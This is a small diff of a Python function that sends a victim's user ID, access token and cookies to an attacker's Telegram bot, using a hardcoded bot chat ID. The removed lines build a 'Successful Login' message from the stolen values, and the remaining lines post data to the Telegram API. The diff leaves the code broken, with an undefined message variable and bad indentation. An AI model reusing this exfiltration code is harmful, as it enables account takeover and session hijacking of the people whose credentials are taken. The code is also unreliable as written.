@@ -25,19 +25,10 @@ def handle_telegram_message(c_user, token, cookie):
     chat_id = "7352132358"  # Replace with your chat ID
     telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
 
-    # Construct the message
-    message = (
-        f"<b>Successful Login:</b>\n"
-        f"UID: {c_user}\n"
-        f"Token: {token}\n"
-        f"Cookies: {cookie}"
-    )
-
-    # Send the request to Telegram
-    data = {
+   data = {
         "chat_id": chat_id,
         "text": message,
-        "parse_mode": "HTML"
+        "parse_mode": "HTML"  # Optional: Remove if you don't need HTML parsing
     }
     try:
         response = requests.post(telegram_url, data=data)
